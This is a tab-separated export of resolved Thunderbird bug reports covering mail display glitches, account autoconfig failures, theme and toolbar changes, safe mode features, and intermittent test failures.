651002%TAB%1303141072%TAB%413375%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Message Reader UI%TAB%comma in the cc field wreaks havok with display,single comma only in to or cc field wreaks havok with display, exception in mailWidgets.xml,single comma only in to or cc field displays cached content, exception in mailWidgets.xml%TAB%comma in the cc field wreaks havok with display,single comma only in to or cc field wreaks havok with display, exception in mailWidgets.xml,single comma only in to or cc field displays cached content, exception in mailWidgets.xmlThis might be a little difficult to reproduce, but bear with me.  We have a piece of software that creates automatic email messages.  One piece of bad behavior from this software is that it apparently inserts a plain comma, all by itself, in the CC field.  (This is a bit of sloppiness in the handling of multiple CC recipients that is being addressed in that software).  Nonetheless, it exposed a nasty bug in Thunderbird that does not manifest in other email clients.  When you are reading a mail message (particularly in the three-pane window) that has a CC field with just a single comma in it, you get the following behavior:  1) In the bottom view pane, Thunderbird always "fills in" the recipients that were CC'ed on the last message you read before this one.  They're not really there (as one can confirm from Viewing Message Source), but it's jarring nonetheless.  2) There's often the same effect with the Subject line - in the bottom view pane, it replaces the legitimate Subject line of the email you're viewing with the Subject line of your last viewed message.  Looking at the View Message Source, I see that the Subject line is right after the CC line.  So you might have something like this in the source:  CC: , SUBJECT: Real subject line here  ... but it displays in the bottom pane as:  from (correct sender) subject (wrong subject from previous message) to (you) cc (people from previous message)   Reproducible: Always  Steps to Reproduce: Not sure how to create what is clearly a malformed email (with CC: ,) ... but if you can, you'll see what I'm talking about.  If you need me to forward you such a message, give me an email to shoot it to.  Because of course, when I try to make the well-behaved Thunderbird message creation window do this, it won't.  Good Thunderbird.
650892%TAB%1303123446%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%[autoconfig] Can't create accounts - fails at around the time of searching the ISP database (getService fails in guessConfig.js)%TAB%[autoconfig] Can't create accounts - fails at around the time of searching the ISP database (getService fails in guessConfig.js)I was trying out the new account wizard on my debug build on a fresh profile, and when the dialog got displayed, I saw the following:  ###!!! ASSERTION: Recursive GetService!: 'Error', file /Users/moztest/comm/aurora/src/mozilla/xpcom/components/nsComponentManager.cpp, line 1663 JavaScript error: , line 0: uncaught exception: [Exception... "Component returned failure code: 0x80570016 (NS_ERROR_XPC_GS_RETURNED_FAILURE) [nsIJSCID.getService]"  nsresult: "0x80570016 (NS_ERROR_XPC_GS_RETURNED_FAILURE)"  location: "JS frame :: chrome://messenger/content/accountcreation/guessConfig.js :: <TOP_LEVEL> :: line 41"  data: no]  I then tried to do some lookups, and Thunderbird crashed part way through.  This appears to be fallout from bug 619201, which now makes NSS initialise the certificate override service (nsICertOverrideService).  guessConfig.js tries to fill a global variable with the service when we open up the account wizard. The issue here is that it then causes NSS to initialise, which then means NSS tries to getService the nsICertOverrideService, at which point XPCOM complains.  I think the easiest way around this for us is to not have the global variable, but just use the service when we actually require it.
650798%TAB%1303106466%TAB%273994%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Address Book,Message Compose Window%TAB%Contacts sidebar: Missing accelerator keys on context menu%TAB%Contacts sidebar: Missing accelerator keys on context menuSTR  1 In compose window, view contacts sidebar (F9) 2 Right-click to get context menu of a contact, or multiple selected contacts  Actual - Context menu entries do not have accelerator keys, nor indications thereof - only unique initial letters work as accelerator keys (D for delete, P for properties), Add-to... menus do not have a unique accelerator key (could use the same as on the buttons in the sidebar).  Expected - define accelerator keys, so that they are unique for each entry, and indicated on the menus  D_e_lete _P_roperties _A_dd to To A_d_d to CC Add to _B_CC  We should not use D as an accelerator for Delete, because of ux-consistency with the buttons, where we have alt+d for "Add to To".
650703%TAB%1303056414%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Port bug 593525 to Thunderbird,Port bug 593525 to Thunderbird (Mark as flagged/file toolbar button shouldn't depend on archive being allowed)%TAB%Port bug 593525 to Thunderbird,Port bug 593525 to Thunderbird (Mark as flagged/file toolbar button shouldn't depend on archive being allowed)From a code point of view, it looks like TB may want to port the "UI fix" patch from that bug...
650702%TAB%1303056097%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Message/Mark All Read doesn't get disabled when there are no (zero) unread messages/all messages are read%TAB%Message/Mark All Read doesn't get disabled when there are no (zero) unread messages/all messages are readBuild ID : 2000121408.  Message/Mark All Read doesn't get ghosted after a successful marking.  Steps to Repro:  1. Go to any newsgroup 2. Go to Message/Mark All Read  Expected Results:  This function should Mark All Messages As Read and then become ghosted out like As Read/Thread As Read already are.  Actual Results:  Function is not ghosted out.
650642%TAB%1303024279%TAB%42319%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%[Pinstripe] Make the filterdialog and the advanced search dialogs look better%TAB%[Pinstripe] Make the filterdialog and the advanced search dialogs look betterThis is basically a port of the work I've done for seamonkey (clarkbw and I talked about this for a while ago). The most visible effect is the new buttons.  This also includes my proposal in bug 621546. It's all about these lines: -------------------- +#searchTermList { +  -moz-user-focus: ignore; +} + +#searchTermList > listitem[selected="true"] { +  background-color: inherit; +} --------------------  The last rule was in the original patch, that sort worsened the problem with no focus indication when you tabbed to the listbox. By adding the "ignore", the tab order is skipped for the listbox (see bug 621546 for more info). Another alternative is to remove the above rules.
650231%TAB%1302834659%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Pick up the changes for Thunderbird's About dialog from the revised Firefox version%TAB%Pick up the changes for Thunderbird's About dialog from the revised Firefox versionI'd like us to pick up the revised About dialog that Firefox has. It seems a much better revised dialog, and means we can hide the Check For Updates like FF does and de-emphasise the version number.  I think it also lays the information out in a much better way and gets rid of the about:credits page (about:contributors is still there though); hence we won't need to fix bug 645475 if we do this before Miramar is released.  For this bug, I'm not ready to pick the channel changing code up yet. Once we've got our branch strategies in place, then we can pick that up if we want it.  I'm marking this as a soft blocker, as I think it'll help the revised strategy for updates going forward where we de-emphasise the update mechanism and version numbers (we still have about:support for things like that).
650170%TAB%1302794409%TAB%413022%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme,Toolbars and Tabs%TAB%[Feature Request] Firefox(4) Menu for Thunderbird,[aero] Firefox(4) Menu for Thunderbird,[aero] Firefox-like Application Button/Menu for Thunderbird,Firefox-like Application Button/Menu for Thunderbird%TAB%[Feature Request] Firefox(4) Menu for Thunderbird,[aero] Firefox(4) Menu for Thunderbird,[aero] Firefox-like Application Button/Menu for Thunderbird,Firefox-like Application Button/Menu for ThunderbirdUser-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/12.0.733.0 Safari/534.29 Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.2pre) Gecko/20110414 Thunderbird/3.3a4pre  Now with Firefox 4 being released and the imo great success of the new Firefox menu, it's time to bring that beauty to Thunderbird, too.  Reproducible: Always
649989%TAB%1302759532%TAB%225658%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%display account names in favorite folders pane view only when there are duplicated folder names,display account names in favorite folders pane view only when there are duplicated folder names and location info in the tooltip%TAB%display account names in favorite folders pane view only when there are duplicated folder names,display account names in favorite folders pane view only when there are duplicated folder names and location info in the tooltipRight now (tb 3.1, 3.3pre) in favorite folders pane view we display account name alongside every folder name (and optionally unread count). This brings a lot unwanted and not really needed noise to main user interface of Thunderbird.  In Thunderbird 2 (not sure when this changed) there were only folder names (and unread counts) and it was somewhat satisfying since one has explicit control over selection of folders to be displayed in this view and needs to explicitly optin to have sth displayed there (duplicated or not).  Probably to work around some (rare?) cases when user cannot change some folder names and still wants them to be displayed in this view there was a change to simply add account names…  Displaying account names for every folder is not needed (since user explicitly selected them and knows where they belong to), distracts and is only useful for duplicated folder names. We should provide a better way to distinguish folders with duplicated names to lower the noise factor.  Displaying account names only for folders with duplicated names should be good enough solution but there may be as well some better one.
649890%TAB%1302717285%TAB%198524%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%The "M" shortcut for mark read/mark unread is nonfunctional in the standalone message window%TAB%The "M" shortcut for mark read/mark unread is nonfunctional in the standalone message windowLike the summary says, it doesn't work in the SA window.
649479%TAB%1302608129%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Border not on the whole width on the tab bar%TAB%Border not on the whole width on the tab barbwinton found this gap in border in Bug 638407
649344%TAB%1302589596%TAB%312990%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%nsIXULBrowserWindow requires onBeforeLinkTraversal method%TAB%nsIXULBrowserWindow requires onBeforeLinkTraversal methodUser-Agent:       Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.28 (KHTML, like Gecko) Chrome/12.0.725.0 Safari/534.28 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0.1pre) Gecko/20110411 Thunderbird/3.3a4pre  an exception is thrown if click a link in content tab.  Exception: Error: [Exception... "'JavaScript component does not have a method named: "onBeforeLinkTraversal"' when calling method: [nsIXULBrowserWindow::onBeforeLinkTraversal]"  nsresult: "0x80570030 (NS_ERROR_XPC_JSOBJECT_HAS_NO_FUNCTION_NAMED)"  location: "<unknown>"  data: no]  Reproducible: Always
649304%TAB%1302581002%TAB%275144%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Theme%TAB%attachment bar should not be transparent%TAB%attachment bar should not be transparentI can barely read what the attachments bar says.
648018%TAB%1302077212%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%ISP files aren't read anymore,ISP files aren't read from harddisk anymore since the omni.jar change%TAB%ISP files aren't read anymore,ISP files aren't read from harddisk anymore since the omni.jar change1) Create an ISP config xml file. 2) put it in the ISP directory 3) Try to create an account  Account data is fetched from the ISPDB  Console says : mail.wizardINFOfetchConfigFromDisk failed: [Exception... "Component returned failure code: 0x80520012 (NS_ERROR_FILE_NOT_FOUND) [nsIChannel.open]"  nsresult: "0x80520012 (NS_ERROR_FILE_NOT_FOUND)"  location: "JS frame :: chrome://messenger/content/accountcreation/util.js :: readURLasUTF8 :: line 112"  data: no]
647955%TAB%1302047821%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%FolderDisplayListenerManager.unregisterListener doesn't work%TAB%FolderDisplayListenerManager.unregisterListener doesn't workThere is a typo in FolderDisplayListenerManager.unregisterListener rendering it a no-op. This doesn't really matter for Thunderbird code, since nothing uses it, but extensions may want to use it (my account/folder summary code would very much like it).  Attached is the fix. No tests, since this is a simple typographical error in a function no one actually uses. If you really want tests, let me know, and I'll oblige.
647036%TAB%1301581548%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Allow attachment pane of a message to open non-collapsed by default%TAB%Allow attachment pane of a message to open non-collapsed by defaultThe redesign of the attachment pane in bug 282068 now shows it collapsed with a nice indication about the number of attachments and their size. This is an improvement for users frequently receiving many attachments, or with mostly inlined-displayed content (images or text) for which the attachment list and icons would be redundant.  However, another class of users will typically receive a small amount of attachments, and they may not be displayable inline (e.g., PDF or Word files). Consequently, these users now need a click more, (1) open the attachment pane, (2) double-click on the attachment to open it. Even more, if just a single attachment is received, its name is presented next to the button, but that label isn't clickable and thus can't be used to open the attachment.  A couple of possible solutions to this issue:  (a) Add an explicit preference setting whether top open collapsed=true/false; (b) remember the last setting (opened or closed) and use it for the next opened     message (may be more intuitive than a hidden pref); (c) have some "more"-style mechanism, thus showing a single row of attachments     and allow it to expand with the button if more attachments are present     (this would be my personal favorite, easily allowing the first attachments     to be accessed while not filling up considerable space if more than one     row is needed).
646638%TAB%1301488939%TAB%118614%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Address Book%TAB%vCards from webpages and the desktop cannot be opened / imported to Thunderbird.%TAB%vCards from webpages and the desktop cannot be opened / imported to Thunderbird.Often I find vCards on a webpages that I would like to be imported into my address book. Clicking the link, wants to bring up outlook, and even if thunderbird is selected as the correct application to open the file, Thunderbird does not appear recognize that any action has transpired. This is the same even if I save the vCard to my desktop.  Reproducible: Always  Steps to Reproduce: 1. Just as a random example there is a vCard on the page here: http://www.grubb-ellis.com/Company/OurOffices/OfficeDescription.aspx?id=1858 2. Click it and select thunderbird to open the file. 3. Sadness ensues as thunderbird does not respond to your request. Actual Results:   Thunderbird does not seem to recognize that a request has transpired.   Expected Results:   Thunderbird would open your address book, and show you where it has inserted your entry. Or in the case of multiple address books, you are prompted for the correct book to insert the new record into.
646570%TAB%1301478297%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Implement Bug 603790 in TB,Implement Bug 603790 in TB (remove the drop shadow and reduce border radius for buttons)%TAB%Implement Bug 603790 in TB,Implement Bug 603790 in TB (remove the drop shadow and reduce border radius for buttons)Bug 603790 removed the shadow and reduced the radii of the toolbarbuttons and textfields.  Attachment 523015 [details] shows the difference.  Should we follow this to stay in synch with FF?
646307%TAB%1301415128%TAB%151407%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%stop annoying error console message: Warning: reference to undefined property msgWindow.msgHeaderSink%TAB%stop annoying error console message: Warning: reference to undefined property msgWindow.msgHeaderSinkOnMsgParsed is constantly causing the following error console message to be spammed *3 times* every time we display a message.  Warning: reference to undefined property msgWindow.msgHeaderSink Source File: chrome://messenger/content/mailWindowOverlay.js Line: 2832  I mainly care because it is cluttering up the fancy pants logging shown on ArbPL, but we can pretend this is a noble pursuit to make our error console output not horrible.
646032%TAB%1301370867%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Missing minus\plus icons on new feature Ability to collapse attachment pane,Missing minus\plus icons on new feature Ability to collapse attachment pane (plus: make single attachment name clickable for opening / context menu / drag&drop while collapsed)%TAB%Missing minus\plus icons on new feature Ability to collapse attachment pane,Missing minus\plus icons on new feature Ability to collapse attachment pane (plus: make single attachment name clickable for opening / context menu / drag&drop while collapsed)The new landed feature appears broken as show in attached screenshot  Mozilla/5.0 (Windows NT 6.1; rv:2.0pre) Gecko/20110329 Thunderbird/3.3a4pre  In safe-mode behaves the same.
645552%TAB%1301227998%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Thunderbird's tabmail does not honor onbeforeunload event handlers%TAB%Thunderbird's tabmail does not honor onbeforeunload event handlersSTR: - open a Gmail content tab, - compose a new message, - type some text in the message body, - close the tab.  In Firefox, this fires the "are you sure you want to navigate away from this page?" dialog. In Thunderbird, this closes the tab right away. I believe Thunderbird needs to do something regarding beforeunload event handlers, and possibly give them a chance to run before actually closing the tab.
645509%TAB%1301210298%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Chrome tabs should be allowed to have favicons too%TAB%Chrome tabs should be allowed to have favicons tooCurrently, the code from specialTabs.js has a DOMLinkHandler class that reacts upon seeing a <link> element pass by, and updates the favicon of the tab accordingly. Unfortunately, this is just for content tabs. Chrome tabs might want to have their favicon too! In my case, my "compose in a tab" thing wants to have a nice favicon too, so the attached patch does just that.
645327%TAB%1301122309%TAB%218420%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Today build 20110326 is broken on message in tab%TAB%Today build 20110326 is broken on message in tabWith today build  Mozilla/5.0 (Windows NT 6.1; rv:2.0pre) Gecko/20110326 Thunderbird/3.3a4pre  when a message is opened in a tab a great zone is grayed and unreadable!  removing removing -moz-appearance: -moz-win-borderless-glass fixes the issue  It has nothing to do with removing -moz-appearance: -moz-win-borderless-glass.  With yesterday nightly (20110325) 'Open message in tab' works. With today nightly (20110326) I see also your Bug. When I exchange the omni.jar with the one from yesterday (with Aero Glass enabled) it works again.  The bug must come from a landing between the two nightlys.
644983%TAB%1301029834%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%window.top.content is null (unable to view feed entries)%TAB%window.top.content is null (unable to view feed entries)STR: - install webtabs from http://jonathan.protzenko.free.fr/webtabs@momo.ca.xpi - open a twitter tab - switch to the main mail:3pane tab - select multiple threads (so that you get the MultiMessageSummary) - switch to the twitter tab - switch back to the main mail:3pane tab - click on one of your RSS feeds - there should be a message displayed ; instead, the message pane is blank, and the error console reads  Error: window.top.content is null Source File: chrome://messenger/content/mailWindowOverlay.js Line: 3072  This happens *without* Thunderbird Conversations. Double-clicking on a feed item fixes the issue.
644800%TAB%1300977360%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Assignments to undefined variables in selectionsummaries.js%TAB%Assignments to undefined variables in selectionsummaries.jsI noticed a couple of warnings on arbpl.
644567%TAB%1300943564%TAB%410597%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Search,Graphics,General,Search,Folder and Message Lists%TAB%large search text causes thunderbird to hang,large search text causes thunderbird to hang then crash [@ operator new(unsigned int) | gfxTextRun::operator new(unsigned int, unsigned int, unsigned int)]%TAB%large search text causes thunderbird to hang,large search text causes thunderbird to hang then crash [@ operator new(unsigned int) | gfxTextRun::operator new(unsigned int, unsigned int, unsigned int)]User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 ( .NET CLR 3.5.30729; .NET4.0E) Build Identifier: 3.1.9  While having a lot of lorem ipsum text in my clipboard I thought I copied a keyword to search for more messages and ended up pasting about 2 million characters into the search bar which caused thunderbird to hang and eventually crash bringing up the Mozilla Crash Reporter.  Reproducible: Always  Steps to Reproduce: 1. Put a large body of text into your clipboard (http://www.lipsum.com/ to generate text) 2. Paste this large text buffer into your search bar 3. Watch as Thunderbird crashes Actual Results:   Thunderbird will hang for a while and eventually crash, I believe this is due to memory exhaustion.  Expected Results:   Thunderbird should have a maximum amount of potential characters that it searches for to avoid this issue.
644169%TAB%1300866692%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Provide tabs on top feature like FF 4.0,Move tab selector above the mail toolbar, and give each tab its own toolbar.,Move tab selector above the mail toolbar, and give each tab its own toolbar (tabs on top for Thunderbird)%TAB%Provide tabs on top feature like FF 4.0,Move tab selector above the mail toolbar, and give each tab its own toolbar.,Move tab selector above the mail toolbar, and give each tab its own toolbar (tabs on top for Thunderbird)Implements "Tabs on top" feature (for me is to have opacity of toolbar buttons on Aero Theme (like in FF 4.0)). Also affects Ubuntu 11.04, when using globalmenu extension.  In this case, the menu is renderend on panel, but the progress indicator still using that space (see screenshot). Using tabs on top (like FF does) the problem will be solved (see the another screenshot).
644079%TAB%1300840330%TAB%81754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%bug in QuickFilterManager.killFilter,QuickFilterManager.killFilter always removes the last filter%TAB%bug in QuickFilterManager.killFilter,QuickFilterManager.killFilter always removes the last filterUser-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Lightning/1.0b2 Thunderbird/3.1.9  QuickFilterManager.killFilter always remove the last one filter  Reproducible: Always  Steps to Reproduce: 1.add two new filters to QuickFilterManager by defineFilter, say filter1,filter2 2.remove filter1 by killFilter(filter1) 3. Actual Results:   filter2 was removed  Expected Results:   filter1 was removed  typo?  current code is:   killFilter: function MFM_killFilter(aName) {     let filterDef = this.filterDefsByName[aName];     this.filterDefs.splice(this.filterDefs.indexOf(aName), 1); // ERROR     delete this.filterDefsByName[aName];   },  The ERROR line should be: this.filterDefs.splice(this.filterDefs.indexOf(filterDef), 1);  note that aName changed to filterDef
643663%TAB%1300732948%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Attachment name+size needs localizable string%TAB%Attachment name+size needs localizable stringCurrently, the formatting for the attachment name and size is hardcoded as "name (size)", which is a problem for RTL locales. This should use a localizable format string so that things don't look messed up in those locales.  There's a similar bug somewhere about the same issue for unread message counts in the folder pane, but I couldn't find it.
643262%TAB%1300594655%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%Update the appearance of the Contacts sidebar%TAB%Update the appearance of the Contacts sidebarThe Contacts sidebar does not fit well with the new appearance in Aero theme. I think this needs an overhaul. On the left the actual style and on the right the proposed styling (already with Aero Glass patch).  What I changed:  - sidebar header equal to the FolderPane header. - background matching the MessageHeaders toolbar. - added a bottom border to the address tree to separate it from the button on bottom. - sidebar splitter equal to the FolderPane splitter.
643261%TAB%1300593901%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Toolbarbutton grows when checked="true"%TAB%Toolbarbutton grows when checked="true"Steps to Reproduce: 1. Open a Composer window 2. Add with Customize the Contacts button 3. Click on it to show the Contacts sidebar.  Because of the rule <http://mxr.mozilla.org/comm-central/source/mail/themes/qute/mail/messenger.css#89> used for XP theme the buttons on Vista/Win7 are growing.
642163%TAB%1300265398%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%Colors in compose window don't match Firefox%TAB%Colors in compose window don't match FirefoxWith all the amazing changes we're making to the main window and the address book, it's only fair that the compose window get some additional love as well. I think it would be neat to have the background of the address, subject and toolbar area pick up the Firefox toolbar look&feel.
642103%TAB%1300248736%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Opening a second three-pane window and closing it breaks the UI due to the instrumentation code%TAB%Opening a second three-pane window and closing it breaks the UI due to the instrumentation codeIf I open a second 3-pane window on current trunk and then close it again, the first window's UI is completely broken (can't load different messages etc).  This appears to be a regression from the instrumentation code in bug 632639.  I think that code is trying to remove all or some observers, and failing (because you can't remove observers you haven't added, or ones you've already removed), and then somehow killing the UI completely.
642102%TAB%1300248552%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Instrumentation code should use services modules%TAB%Instrumentation code should use services modulesI was looking at another issue (that I'll file in a moment), but somehow got wrapped up in reworking the instrumentation code to use the Services.jsm and mailServices.js that we now have. Unfortunately I didn't get around to working out how to fix the other issue, but here's the changes anyway.
641806%TAB%1300166454%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Only half of the icons in the message header on OS X are glyphs%TAB%Only half of the icons in the message header on OS X are glyphsReply, Reply All and Forward are glyphs, while Archive, Junk and Delete are full color icons. My qseries is behaving oddish on the Mac, so want to make sure I get the graphics too
641784%TAB%1300156946%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installer%TAB%Stop/Remove the safe mode shortcut from being installed in the start menu%TAB%Stop/Remove the safe mode shortcut from being installed in the start menuOnce bug 641781 and bug 641783 are completed we don't really need the start menu shortcut for safe mode - therefore port the Firefox changes for this to Thunderbird.
641783%TAB%1300156770%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Add an option to the help menu to restart with add-ons disabled%TAB%Add an option to the help menu to restart with add-ons disabledAdd a menu option like Firefox 4 to restart in safe-mode with add-ons disabled. This is part of work to improve safe mode handling in Thunderbird. Right, nice and easy. I'm not sure about the position of the menu item though -- need ui-review for that and for the Release Notes accesskey being changed to N. Firefox 4 kills the Release Notes menu item entirely.
641781%TAB%1300156584%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Port the safe mode startup screen from Firefox to Thunderbird%TAB%Port the safe mode startup screen from Firefox to ThunderbirdWe'd like to port the safe mode start-up screen from Firefox to Thunderbird (see attached screenshot from Firefox).  I've spoken to Bryan and we think that "Disable all add-ons" and "Reset toolbars and controls" are the two options that we can keep.  This will form part of work to improve our safe mode set-up to follow suit with what Firefox has done.
641455%TAB%1300070893%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Bugs found during testing of Thunderbird 3.3 Alpha 3 release candidates - (3.3a3)%TAB%Bugs found during testing of Thunderbird 3.3 Alpha 3 release candidates - (3.3a3)Bugs found during testing of Thunderbird 3.3 Alpha 3 release candidates. Please mark them as blocking this bug rather than commenting on them here.
641331%TAB%1300001618%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%[autoconfig] Remove duplicate string definition in accountCreation.properties%TAB%[autoconfig] Remove duplicate string definition in accountCreation.propertiesInitially reported by Hasse in bug 549045 comment #222: > Nit: the string "resultSTARTTLS" is defined twice in > accountCreation.properties,  first on > http://mxr.mozilla.org/comm-central/source/mail/locales/en-US/chrome/messenger/accountCreation.properties#91 > and then again on line 95.
641253%TAB%1299932300%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Message > Mark menu shouldn't be disabled when no messages are selected%TAB%Message > Mark menu shouldn't be disabled when no messages are selectedOn trunk, the Message > Mark menu is disabled if no messages are selected. Since some of the submenu items apply to an entire folder (As Read by Date and All Read), it should remain enabled.
641247%TAB%1299931085%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Remove unused commands, commandset, broadcaster and toolbarbuttons from editorOverlay%TAB%Remove unused commands, commandset, broadcaster and toolbarbuttons from editorOverlayWhen editorOverlay.xul was forked there was xul code left in which was not used by message compose window, it should probably be removed. 
641193%TAB%1299892260%TAB%151407%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%improve fancy mozmill logging, round 2%TAB%improve fancy mozmill logging, round 2Here are some logging improvements I would like to land because they will help me fight our fairly consistent intermittent oranges.  I was trying to use these on the try server to help, but the failures didn't actually happen on the try server for the two pushes I performed (with some minor logging changes between the two).  This either means my logging changes alter timing enough to stop the intermittent oranges, or there is some horrible subtle difference between the try runs and the non-try runs.  (Packages tests versus non-packaged?)  One thing made obvious to me is I'm not sure how to make buildbot just re-run unit tests.  I have access to the admin variant, but all I could see was a way to order it to do a complete rebuild of a push.  I told it to do that for one of the linux builders, but since I haven't seen the results show up yet, I presume it did not work right.  Or I killed buildbot, because I can't get it to respond right now so I can see the buildbot waterfall instead of depending on tinderbox.   Logging improvements:  - Better identify windows by more consistently reporting their window type and by tagging all windows with unique integers that we report.  - Introduced a "b" class of logging for "winhelp" and "fdh" for boring events.  This is really just a presentation thing that's the lesser evil versus complicating the client side a lot more at this point.  - Map keyCode values to VK_CONSTANTS and show charCodes as actual characters for keypress events.  - Log window activation/deactivation.  (Note: only happens once we augment the windows.  The resulting event stream for when a new window shows up tends to be: "window we know about deactivates", "we augment the new window", "we hear about the new window deactivating in favor of some other window we already knew about".    I tried to hook us up during the onOpenWindow event, but could not readily poke our unique id anywhere and do not believe the blind spot is large enough to justify figuring out how to actually make that work at this time.)
640898%TAB%1299802079%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-tooltip-multimessage.js | test_tooltips%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-tooltip-multimessage.js | test_tooltipsTEST-UNEXPECTED-FAIL | test-tooltip-multimessage.js | test_tooltips   EXCEPTION: defView.getComputedStyle(tipElement, "") is null     at: mailWindow.js line 636        FillInHTMLTooltip([object XULElement]) mailWindow.js 636        test_tooltips() test-tooltip-multimessage.js 76             frame.js 474             frame.js 530             frame.js 573             frame.js 417             frame.js 579             server.js 164             server.js 168
640877%TAB%1299792582%TAB%151407%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Folder and Message Lists%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-selection.js | test_selection_extension%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-selection.js | test_selection_extensionThe following random orange is being pretty reliably seen on the newly unstarred linux builders:  TEST-UNEXPECTED-FAIL | test-selection.js | test_selection_extension   EXCEPTION: Timeout waiting for events: [undefined undefined]     at: test-folder-display-helpers.js line 143             test-folder-display-helpers.js 143        mark_failure([object Array]) logHelper.js 588        FolderListener_waitForEvents() test-folder-display-helpers.js 1555        wait_for_folder_events() test-folder-display-helpers.js 1587        press_delete() test-folder-display-helpers.js 1318        test_selection_extension() test-selection.js 67             frame.js 474             frame.js 530             frame.js 573             frame.js 417             frame.js 579             server.js 164             server.js 168  Per arbpl logging, this is one of those exciting situations where our (delete) keypress event doesn't seem to actually be happening.  At the time of event generation, there is no focused element in the window, but I don't think that should actually affect anything (and the window proper will just catch it; this needs more investigation/remembering).  A possibility for the greater problem is that at the time we generate the failure notification, the Thunderbird window is not the active window, suggesting we may just be refusing to generate the event because the window is not focused.   This is one of those analyses where it would be nice to be able to easily see what the logging shows for a healthy run of the test.  Unfortunately, it's prohibitively expensive to log that data for successful tests for every run.  One easier way to address this without getting crazy would be to let us annotate specific runs as deserving of having their output logged every time.  We would do this by either leveraging the try server or doing a short-lived test-only type patch.  Another way would be to have runs where we do dump everything, but have that be a special buildbot job that only runs once a week or something.  The arbpl server would need to special-case these runs, but could then offer a "compare with baseline" option.
640714%TAB%1299755373%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Add dictionaries from the mail context menu should open a content tab when possible%TAB%Add dictionaries from the mail context menu should open a content tab when possibleOpen the dictionaries URL in a content tab instead always going through the external browser.
